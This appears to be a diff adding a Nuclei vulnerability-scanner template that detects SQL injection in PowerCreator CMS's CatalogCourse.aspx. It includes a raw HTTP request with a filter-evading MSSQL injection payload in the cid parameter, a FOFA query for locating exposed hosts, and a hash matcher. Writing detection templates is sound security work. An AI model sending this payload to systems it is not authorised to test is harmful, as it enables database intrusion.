@@ -1,0 +1,36 @@
+id: powercreator-CatalogCourse-sqli
+info:
+  name: PowerCreator CatalogCourse.aspx - sqli
+  author: leadlife
+  severity: high
+  description: PowerCreator接口 CatalogCourse.aspx存在sql注入漏洞。攻击者可利用该漏洞获取服务器上的信息。
+  reference: 
+    - https://github.com/eeeeeeeeee-code/POC/blob/a1c520b2b43d6691937b235e5d11900d75e28e21/wpoc/PowerCreator/PowerCreator%E6%8E%A5%E5%8F%A3CatalogCourse.aspx%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  classification:
+    cve-id: 
+  metadata:
+    verified: false
+    fofa-query: app="PowerCreator-CMS"
+    tips: 资产过少，无法验证
+  tags: powercreator,sqli
+
+http:
+  - raw:
+      - |
+        GET /CatalogCourse.aspx?cid=1%0Cand%0C1=sys.fn_sqlvarbasetostr(HashBytes(%27MD5%27,%27123456%27))-- HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+        Accept: */*
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate, br
+        Connection: keep-alive
+        Cookie: ASP.NET_SessionId=l2wuj2tri5e554020jeezoyw; language=simpleChineses
+        Pragma: no-cache
+        Cache-Control: no-cache
+        
+    matchers:
+      - type: dsl
+        dsl:
+          # - status_code == 200
+          - contains_all(body,'e10adc3949ba59abbe56e0')
+        condition: and
